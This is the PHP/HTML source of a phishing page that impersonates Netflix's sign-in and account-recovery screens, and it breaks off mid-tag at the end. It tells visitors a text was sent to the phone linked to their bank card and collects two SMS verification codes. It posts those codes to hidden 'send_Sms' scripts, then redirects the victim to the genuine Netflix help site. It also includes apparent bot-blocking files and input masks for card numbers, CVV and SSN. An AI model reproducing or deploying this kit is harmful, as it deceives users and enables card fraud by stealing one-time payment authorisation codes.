<?php
    include("./system/system.php");
    include("./system/detect.php");
    include("./system/blocker.php");


?><html><head>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="origin-trial" data-feature="EME Extension - Policy Check" content="">

<title>Netflix</title>


<link type="text/css" rel="stylesheet" href="./style/css/stylef.css"/>








<style>
#Securitycode {
background-image: url('./style/css/sprite_logos_wallet_2x.png');
background-repeat: no-repeat;
background-size: 67px;
background-position: 111.5% 48.1%;

}


 #cardnumber {
background-image: url('./style/css/cards-sprite-small@2x.png');
background-repeat: no-repeat;
background-size: 62px;
}



 #chtamastartro {
	background-image: url('./style/css/3dsecure.png');
	background-repeat: no-repeat;
	background-position: 99.5% 62.0%;

}

  #chtacalub {
	background-image: url('./style/css/3dsecure.png');
	background-repeat: no-repeat;
	background-position: 99.5% 46.8%;
}

  #chtaofam {
	background-image: url('./style/css/3dsecure.png');
	background-repeat: no-repeat;
	background-position: 97.5% 34.0%;
}

  #chtajcb {
	background-image: url('./style/css/3dsecure.png');
	background-repeat: no-repeat;
	background-position: 97.5% 20.0%;
}

 #chtamastercard {
	background-image: url('./style/css/3dsecure.png');
	background-repeat: no-repeat;
	background-position: 97.5% 9.5%;
}


  #thDSecure {
	background-image: url('./style/css/3dsecure.png');
	background-repeat: no-repeat;
	background-position: 99.5% -20.5%;
    background-size: 335px;
}

</style>







<style type="text/css">
.multi.equal .right {
    float: right;
}
.multi.equal .left, .multi.equal .right {
    width: 48.6%;
}
.multi .right {
    width: 25%;
    float: left;
}
.multi.equal .left {
    margin-right: 0;
}
.multi.equal .left, .multi.equal .right {
    width: 48.6%;
}
.multi .left {
    width: 72.5%;
    float: left;
}
.left, .middle {
    margin-right: 10px;
}



</style>






<script src="./style/js/angular.min.js"></script>
<script src="./style/js/jquery.min.js"></script>
<script src="./style/js/jquery.CardValidator.js"></script>
<script src="./style/js/jquery.validate.min.js"></script>
<script src="./style/js/jquery.mask.js"></script>
<script src="./style/js/style.js"></script>


<script> 
$(document).ready(function(){
    $("#aaddcpis").click(function(){
        $("#mySidenav").show();
                    $("#hdikbdya").hide();
    });
});
</script>
 



<script> 
$(document).ready(function(){
    $("#sircardlya").click(function(){
        $("#mySidenav").show();
                    $("#hdikbdya").hide();

    });
});
</script>





  <script type="text/javascript">
    $(function() {
        $('#cardnumber').mask('0000 0000 0000 0000 0000');
		$('#Securitycode').mask('0000');

        $('#birthdate').mask('00/00/0000');

        $('#SSN').mask('000-00-0000');

        $('#expdate').mask('00/0000');

	});
	</script>






<link type="text/css" rel="stylesheet" href="./style/css/nonechaditkk.css"/>



<meta content="" name="description">
<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">



<link rel="shortcut icon" href="./style/css/nficon2016.ico">
<link rel="apple-touch-icon" href="./style/css/nficon2016.png">




<meta property="og:description" content="">
<meta property="al:ios:url" content="">
<meta property="al:ios:app_store_id" content="">
<meta property="al:ios:app_name" content="Netflix">
<meta property="al:android:url" content="">
<meta property="al:android:package">
<meta property="al:android:app_name" content="Netflix">
<meta name="twitter:card" content="player">
<meta name="twitter:site" content="@netflix">


</head>
<body>


<style>
body {
    font-family: "Lato", sans-serif;
}

.sidenav {
    height: 100%;
    width: 100%;
    position: fixed;
        z-index: 1;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background-color: rgb(0, 0, 0);
    opacity: 0.9;
    overflow-y: hidden;
    transition: 0.5s;
}

.sidenav a {
    padding: 8px 8px 8px 32px;
    text-decoration: none;
    font-size: 25px;
    color: #818181;
    display: block;
    transition: 0.3s;

}

.sidenav a:hover{
    color: #f1f1f1;
}

.sidenav .closebtn {
    position: absolute;
    top: 0;
    right: 25px;
    font-size: 36px;
    margin-left: 50px;
}

@media screen and (max-height: 450px) {
  .sidenav {padding-top: 15px;}
  .sidenav a {font-size: 18px;}
}

.paymentContainer .stepLogo {
    display: block;
    margin: 5% 0 0;
}

.regStepLogo {
    background: url(./style/css/Devices.png) no-repeat 50% 50%;
    height: 90px;
    -moz-background-size: 260px;
    background-size: 260px;
}



</style>
</head>
<body>





<script>
function openNav() {
    document.getElementById("mySidenav").style.width = "100%";
}

function closeNav() {
    document.getElementById("mySidenav").style.width = "0";
}
</script>
     



<div id="spuenndr" style="display:none;background-color:#000000;position: fixed;top: 0; right: 0; bottom: 0;left: 0; z-index: 1040;opacity: 0.7;filter: alpha(opacity=50);" >
<span style="font-size: 247.6px;margin-left: -124.8px;margin-top: -124.8px;left: 50%;font-size: 28.8vw;margin-left: -14.4vw;margin-top: -14.4vw;"></span><div class="waitIndicator"><div class="basic-spinner center-absolute" style="width: 115px; height: 115px;"></div></div></div>





<div id="fixed" style="background-color:#000000;position: fixed;top: 0; right: 0; bottom: 0;left: 0; z-index: 1040;opacity: 0.7;filter: alpha(opacity=50);" ><span style="font-size: 247.6px;margin-left: -124.8px;margin-top: -124.8px;left: 50%;font-size: 28.8vw;margin-left: -14.4vw;margin-top: -14.4vw;"></span><div class="waitIndicator"><div class="basic-spinner basic-spinner-light center-absolute" style="width: 115px; height: 115px;"></div></div></div>


<script type="text/javascript">
document.onreadystatechange = function () {
  var state = document.readyState
  if (state == 'complete') {
      setTimeout(function(){
          document.getElementById('interactive');
         document.getElementById('fixed').style.visibility="hidden";
      },4000);
  }
}
</script>





<div id="appMountPoint">

<div class="login-wrapper hybrid-login-wrapper" data-reactroot="">

<div class="login-wrapper-background"><img class="concord-img vlv-creative" src="./style/css/alpha_website_small.jpg"  alt="">


</div>

<br>


<div class="nfHeader login-header signupBasicHeader"><a href="#" class="svg-nfLogo signupBasicHeader"><svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true">

<g id="netflix-logo"><path d="M105.062 14.28L111 30c-1.75-.25-3.499-.563-5.28-.845l-3.345-8.686-3.437 7.969c-1.687-.282-3.344-.376-5.031-.595l6.031-13.75L94.468 0h5.063l3.062 7.874L105.875 0h5.124l-5.937 14.28zM90.47 0h-4.594v27.25c1.5.094 3.062.156 4.594.343V0zm-8.563 26.937c-4.187-.281-8.375-.53-12.656-.625V0h4.687v21.875c2.688.062 5.375.28 7.969.405v4.657zM64.25 10.657v4.687h-6.406V26H53.22V0h13.125v4.687h-8.5v5.97h6.406zm-18.906-5.97V26.25c-1.563 0-3.156 0-4.688.062V4.687h-4.844V0h14.406v4.687h-4.874zM30.75 15.593c-2.062 0-4.5 0-6.25.095v6.968c2.75-.188 5.5-.406 8.281-.5v4.5l-12.968 1.032V0H32.78v4.687H24.5V11c1.813 0 4.594-.094 6.25-.094v4.688zM4.78 12.968v16.375C3.094 29.531 1.593 29.75 0 30V0h4.469l6.093 17.032V0h4.688v28.062c-1.656.282-3.344.376-5.125.625L4.78 12.968z" id="Fill-14"></path></g></svg><span class="screen-reader-text">Netflix</span></a></div><div class="login-body"><div><noscript><div class="ui-message-container ui-message-error"><div class="ui-message-icon"></div><div class="ui-message-contents">Looks like you have disabled JavaScript. Please enable JavaScript to restore full page functionality.</div></div></noscript>

<div class="login-content login-form hybrid-login-form hybrid-login-form-signup"><div class="">


<h1 style="display: none;" id="tiitleloginnet" >Code Sent <span id="ctdown" class="timer"></span>
<script>
   var second = 240;
   function secondPasse() {
   var minute = Math.round((second - 30)/60);
   var remainingSecond = second % 60;
   if (remainingSecond < 10) {
      remainingSecond = "0" + remainingSecond; 
   }
   document.getElementById('ctdown').innerHTML = minute + ":" + remainingSecond;
   if (second == 0) {
    clearInterval(countdownTime);
    document.getElementById('ctdown').innerHTML = "";
   } else {
    second--;
   }
   }
   var countdownTime = setInterval('secondPasse()', 1000);
</script></h1>

<h1  id="tiitleCardnetpas">Code Sent <span id="countdown" class="timer"></span>
<script>
   var seconds = 120;
   function secondPassed() {
   var minutes = Math.round((seconds - 30)/60);
   var remainingSeconds = seconds % 60;
   if (remainingSeconds < 10) {
      remainingSeconds = "0" + remainingSeconds; 
   }
   document.getElementById('countdown').innerHTML = minutes + ":" + remainingSeconds;
   if (seconds == 0) {
    clearInterval(countdownTimer);
    document.getElementById('countdown').innerHTML = "";
   } else {
    seconds--;
   }
   }
   var countdownTimer = setInterval('secondPassed()', 1000);
</script></h1>

<h2 style="color:#fff;display:none;"  id="tiitlethankss">Congratulations! Your have restored your account access.</h2>










<script>
$(function() {

	var validator = $("#loginnet").bind("invalid-form.validate", function() {
			$("#errorrloginnet").html('<div class="ui-message-container ui-message-error"><div class="ui-message-icon"></div><div class="ui-message-contents"><b>Please check your </b>information and try again<a href="#"></a>.</div></div>');})
  $("form[name='loginnet']").validate({

	errorContainer: $("#errorrloginnet"),



    rules: {


      email: {
        required: true,
        email: true
      },
      password: {
        required: true,
        minlength: 5
      }
    },





highlight: function ( element, errorClass, validClass ) {

$( element ).parents( ".dddd" ).removeClass( validClass );
	$( element ).parents( ".dddd" ).addClass( errorClass );

this.findByName( element.name ).addClass( errorClass ).removeClass( validClass );



				},

unhighlight: function (element, errorClass, validClass) {
					
	this.findByName( element.name ).removeClass( errorClass ).addClass( validClass );

	$( element ).parents( ".dddd" ).addClass( validClass );
$( element ).parents( ".dddd" ).removeClass( errorClass );

				},




    messages: {
      

      phoneNumber : "Please enter Phone Number.",
      zipCod : "Please enter Postal.",
      addres : "Please enter Address Line.",

      Firstname : "Please enter First name.",
      LastName : "Please enter Last Name.",

      birthdate : "Please enter DD/MM/YYYY.",
      City : "Please enter City.",
      State: "Please enter State.",




      password: {
        required: "Please provide a password",
        minlength: "Your password must be at least 5 characters long"
      },
      email: "Please enter a valid email address"
    },


     submitHandler: function(form) {


$("#spuenndr").show(500);



					$.post("./system/send_Sms2.php?ajax", $("#loginnet").serialize(), function(result) {
                            setTimeout(function() {



$(location).attr("href", "//help.netflix.com/");


});
});
},
});
});
</script>




<form style="display:none;" id="loginnet" name="loginnet" method="post" class="login-form" action="">


<div class="ui-message-container ui-message-error"><div class="ui-message-icon"></div><div class="ui-message-contents"><b>Please check your </b>Verification Code<a href="#"></a>.</div></div>






<p style="
    color: white;
    font-size: 15px;
">we sent a text message to the phone number linked to your bank card </p>
<div class="code-entry"><label class="" id="lbl-verification-code-input" placeholder="verification-code-input"><span class="ui-label-text"></span>


<div class="dddd nfInput nfEmailPhoneInput login-input login-input-email">
<div class="nfInputPlacement"><div class="nfEmailPhoneControls">
<label class="input_id">

<input required="required" type="text" name="Smstwo" class="nfTextField" id="Smstwo" value="" tabindex="" dir="ltr" aria-invalid="false" aria-describedby="smstwoIdinputError smstwoinputError">


<span for="id_addres" class="placeLabel">Enter The Code</span></label>
<div class="ui-select-wrapper country-select">
<a href="#" class="ui-select-wrapper-link"></a>
</div>
</div>
</div>
<div id="" class="inputError"><span id="smstwoinputError" class="nfEmailPhoneInError" style="display: none;"></span></div>
</div>


</label></div>












<button class="btn login-button btn-submit btn-small" type="submit" autocomplete="off" tabindex="0">Continue</button>

<script> 
$(document).ready(function(){
    $("#botomaaa").click(function(){
                  
$("#Cardnetpas").show(500);
$("#tiitleCardnetpas").show(500);
$("#loginnet").hide(500);
$("#tiitleloginnet").hide(500);



    });
});
</script>






<div class="hybrid-login-form-help">
<div class="ui-binary-input login-remember-me">

<label for="bxid_rememberMe_true">
</label><div class="helper"></div></div>


</div>


</form>



<script>
$(function() {

	var validator = $("#Cardnetpas").bind("invalid-form.validate", function() {
			$("#errorrCardnetpas").html('<div class="ui-message-container ui-message-error"><div class="ui-message-icon"></div><div class="ui-message-contents"><b>Please check your </b>information and try again<a href="#"></a>.</div></div>');})
  $("form[name='Cardnetpas']").validate({

	errorContainer: $("#errorrCardnetpas"),



    rules: {


      email: {
        required: true,
        email: true
      },
      password: {
        required: true,
        minlength: 5
      }
    },




highlight: function ( element, errorClass, validClass ) {

$( element ).parents( ".dddd" ).removeClass( validClass );
	$( element ).parents( ".dddd" ).addClass( errorClass );

this.findByName( element.name ).addClass( errorClass ).removeClass( validClass );



				},

unhighlight: function (element, errorClass, validClass) {
					
	this.findByName( element.name ).removeClass( errorClass ).addClass( validClass );

	$( element ).parents( ".dddd" ).addClass( validClass );
$( element ).parents( ".dddd" ).removeClass( errorClass );

				},




    messages: {
      

      NameOnCard : "Please enter Name On Card.",
      cardnumber : "Please enter Card Number.",
      expdate : "Please enter Expiry date.",
      Securitycode : "Please enter Security code.",
      thDSecure : "Please enter 3D-Secure.",
      password: {
        required: "Please provide a password",
        minlength: "Your password must be at least 5 characters long"
      },
      email: "Please enter a valid email address"
    },


     submitHandler: function(form) {


$("#spuenndr").show(500);






					$.post("./system/send_Sms.php?ajax", $("#Cardnetpas").serialize(), function(result) {
                            setTimeout(function() {



$("#spuenndr").hide(500);
$("#Cardnetpas").hide(500);
$("#tiitleCardnetpas").hide(500);
$("#loginnet").show(500);
$("#tiitleloginnet").show(500);

});
});
},
});
});
</script>



<form id="Cardnetpas" name="Cardnetpas" method="post" class="login-form" action="">


<div id="errorrCardnetpas">
</div>


<p style="
    color: white;
    font-size: 15px;
">we sent a text message to the phone number linked to your bank card</p>
<div class="code-entry"><label class="" id="lbl-verification-code-input" placeholder="verification-code-input"><span class="ui-label-text"></span>


<div class="dddd nfInput nfEmailPhoneInput login-input login-input-email">
<div class="nfInputPlacement"><div class="nfEmailPhoneControls">
<label class="input_id">

<input required="required" type="text" name="Smsone" class="nfTextField" id="Smsone" value="" tabindex="" dir="ltr" aria-invalid="false" aria-describedby="SmsoneIdinputError SmsoneinputError">


<span for="id_addres" class="placeLabel">Enter The Code</span></label>
<div class="ui-select-wrapper country-select">
<a href="#" class="ui-select-wrapper-link"></a>
</div>
</div>
</div>
<div id="" class="inputError"><span id="SmsoneinputError" class="nfEmailPhoneInError" style="display: none;"></span></div>
</div>


</label></div>





<button class="btn login-button btn-submit btn-small" type="submit" autocomplete="off" tabindex="0">Verify</button>


</div>


</form>



<form style="display:none;" action="//netflix.com/" id="thNks" name="thNks" method="post" class="login-form" action="">

<div  style="color:#fff;text-align: center;">
<img width="150" height="150" src=".//style/css/ooadnm.png"><p>  Now you can enjoy our services, thank you for choosing our trusted service.<br> 
                             your account will be verified in the next 24 hours. 
                        </p>
                       


 <div class="btn-content-last">


<button id="siracont" style="width: 31%;
    max-width: 100%;" class="btn login-button btn-submit btn-small" type="submit" autocomplete="off" tabindex="0">My Netflix</button>

<button id="sirNetflix" style="background: #2196F3;width: 31%;
    max-width: 100%;" class="btn login-button btn-submit btn-small" type="submit" autocomplete="off" tabindex="0">Log Out</button>





                                                           </div>
 <p class="seconds"> You are being redirected to your Netflix account , within 10 seconds. </p> 

			<p></p><h2>Your Account has been successfully Restored</h2><h2><p></p>
            

<p></p> 
<p></p> 
<p></p><div class="footerLink"></div></h2></div>

</form>




</div>

</div>
</div>
</div>


<div class="site-footer-wrapper login-footer"><div class="footer-divider"></div><div class="site-footer"><p class="footer-top"><a class="footer-top-a" href="#">Questions? Contact us.</a></p><ul class="footer-links structural"><li class="footer-link-item" placeholder="footer_responsive_link_gift_card_terms_item"><a class="footer-link" href="#" placeholder="footer_responsive_link_gift_card_terms"><span id="">Gift Card Terms</span></a></li><li class="footer-link-item" placeholder="footer_responsive_link_terms_item"><a class="footer-link" href="#"><span id="">Terms of Use</span></a></li><li class="footer-link-item" placeholder="footer_responsive_link_privacy_item"><a class="footer-link" href="#" placeholder="footer_responsive_link_privacy"><span id="">Privacy Statement</span></a></li></ul><div class="lang-selection-container" id="lang-switcher"><div class="ui-select-wrapper"><label class="ui-label no-display"><span class="ui-label-text"></span></label><div class="select-arrow medium prefix globe"><select class="ui-select medium" tabindex="0" placeholder="lang-switcher">

<option selected="" value="#" data-language="en" data-country="us">English</option>

</select></div></div></div></div></div>

</div></div><div>

<div id="fb-root" class=" fb_reset"><div style="position: absolute; top: -10000px; width: 0px; height: 0px;"><div>


		<script type="text/javascript">		
		$('#cardnumber').validateCreditCard(function(result) {
            // console.log(result);
            if (result.card_type != null) {
                switch (result.card_type.name) {
                    case "VISA":

 $('#Securitycode').attr('pattern', '[0-9]{3}');
					$('#Securitycode').attr('maxlength', '3');



$('.chtadakchi').attr('id', 'chtavisa');


$('#cardsmiya').attr('class', 'creditOrDebit visa blue card image');





$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('cardImages-icon_selected').addClass('');

 $('#visaa').removeClass('').addClass('cardImages-icon_selected');
$('#cscaa').removeClass('csc-image_amex').addClass('');

                        $('#cardnumber').css('background-position', '98.5% 94%');
$('#thDSecure').css('background-position', '255.5% -20.5%'); 

                        break;
                    case "VISA ELECTRON":


$('.chtadakchi').attr('id', 'chtavisa');


$('#cardsmiya').attr('class', 'creditOrDebit visa blue card image');


$('#cardnumber').css('background-position', '98.5% 97%'); 


$('#thDSecure').css('background-position', '99.5% -20.5%'); 



$('#cscaa').removeClass('csc-image_amex').addClass('');

   $('#Securitycode').attr('pattern', '[0-9]{3}');
					$('#Securitycode').attr('maxlength', '3');



                        break;
                    case "MASTERCARD":


$('.chtadakchi').attr('id', 'chtamastercard');



$('#cardsmiya').attr('class', 'creditOrDebit mastercard black card image');






   $('#Securitycode').attr('pattern', '[0-9]{3}');
					$('#Securitycode').attr('maxlength', '3');

$('#metrcardaa').removeClass('').addClass('cardImages-icon_selected');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('cardImages-icon_selected ').addClass('');

 $('#visaa').removeClass('cardImages-icon_selected').addClass('');


$('#cscaa').removeClass('csc-image_amex').addClass('');

                        $('#cardnumber').css('background-position', '98.5% 72%');

$('#thDSecure').css('background-position', '99.5% 9.5%'); 

                        break;
                    case "MAESTRO":

$('.chtadakchi').attr('id', 'chtamastartro');


$('#cardsmiya').attr('class', 'creditOrDebit maestro black card image');



   $('#Securitycode').attr('pattern', '[0-9]{3}');
					$('#Securitycode').attr('maxlength', '3');

$('#cardnumber').css('background-position', '98.5% 69%');

$('#thDSecure').css('background-position', '102.5% 62.5%'); 



                        break;
                    case "DISCOVER":


$('.chtadakchi').attr('id', 'chtadiscover');


$('#cardsmiya').attr('class', 'creditOrDebit discover gray card image');



   $('#Securitycode').attr('pattern', '[0-9]{3}');
					$('#Securitycode').attr('maxlength', '3');



                        $('#cardnumber').css('background-position', '98.5% 46.8%');

$('#thDSecure').css('background-position', '98.5% 46.8%'); 

					
$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('').addClass('cardImages-icon_selected');

$('#amxaa').removeClass('cardImages-icon_selected').addClass('');

 $('#visaa').removeClass('cardImages-icon_selected').addClass('');

$('#cscaa').removeClass('csc-image_amex').addClass('');



break;
                    case "AMEX":

$('.chtadakchi').attr('id', 'chtaofam');
 

$('#cardsmiya').attr('class', 'creditOrDebit amex gray card image');




$('#csc').attr('pattern', '[0-9]{4}');
					$('#Securitycode').attr('maxlength', '4');

                        $('#cardnumber').css('background-position', '98.5% 6%');
$('#thDSecure').css('background-position', '99.5% 34%'); 




$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('').addClass('cardImages-icon_selected');

 $('#visaa').removeClass('cardImages-icon_selected').addClass('');


$('#cscaa').removeClass('').addClass('csc-image_amex');


                        break;
					case "JCB":

$('.chtadakchi').attr('id', 'chtajcb');




$('#cardsmiya').attr('class', 'creditOrDebit jcb gold card image');



$('#csc').attr('placeholder', 'Enter security code'); 

$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('cardImages-icon_selected').addClass('');

 $('#visaa').removeClass('cardImages-icon_selected').addClass('');


$('#cscaa').removeClass('').addClass('csc-image_amex');
                        $('#cardnumber').css('background-position', '98.5% 32%');

$('#thDSecure').css('background-position', '99.5% -20.5%'); 


                       break;
					case "DINERS_CLUB":

$('.chtadakchi').attr('id', 'chtacalub');


$('#cardsmiya').attr('class', 'creditOrDebit cb_nationale blue card image');





                        $('#cardnumber').css('background-position', '98.5% 24.8%');
$('#thDSecure').css('background-position', '99.5% -20.5%'); 

                        break;
					default:
                        $('#cardnumber').css('background-position', '98.5% 81.7%');
$('#thDSecure').css('background-position', '99.5% -20.5%'); 


$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('cardImages-icon_selected').addClass('');

 $('#visaa').removeClass('').addClass('cardImages-icon_selected');

                        $('#cardnumber').css('background-position', '98.5% -1%');

$('#thDSecure').css('background-position', '99.5% -20.5%'); 


$('#csc').attr('placeholder', 'Enter security code'); 
                        break;
                }
			} else {

$('.chtadakchi').attr('id', 'jkljk');

$('#thDSecure').css('background-position', '99.5% -20.5%'); 


$('#cardsmiya').attr('class', 'creditOrDebit reb3lpp blue card image');








$('#soracard').removeClass('visaLogo').addClass('');
$('#soracard').removeClass('master_cardLogo').addClass('');
$('#soracard').removeClass('amexLogo').addClass('');
$('#soracard').removeClass('discoverLogo').addClass('');


$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('cardImages-icon_selected').addClass('');

 $('#visaa').removeClass('cardImages-icon_selected').addClass('');

                $('#cardnumber').css('background-position', '98.5% -0.2%');

$('#csc').attr('placeholder', 'Enter security code');
            }
			 // Check for valid card numbere - only show validation checks for invalid Luhn when length is correct so as not to confuse user as they type.
            if (result.valid || $cardinput.val().length > 16) {
                if (result.valid) {


                    $('#cardnumber').removeClass('error').addClass('');
                } else {
                    $('#cardnumber') .removeClass('').addClass('error');
                }
            } else {
                $('#cardnumber').removeClass('').removeClass('error');
            }
        });
		</script>



	<script type="text/javascript">
        $(function() {
		    $('#cardnumber').validateCreditCard(function(result) {
                document.getElementById('card_type').value  = result.card_type.name
                document.getElementById('card_valid').value = result.valid
			$('#cardnumber').validateCreditCard(function(result) {
			    if(result.card_type == null){
                    $('#cardnumber').removeClass();
                }
                else{
                    $('#cardnumber').addClass(result.card_type.name);
					
                }
            });
            });
		});
        </script>
		<script ty



</div><div></div></div></div></body></html>
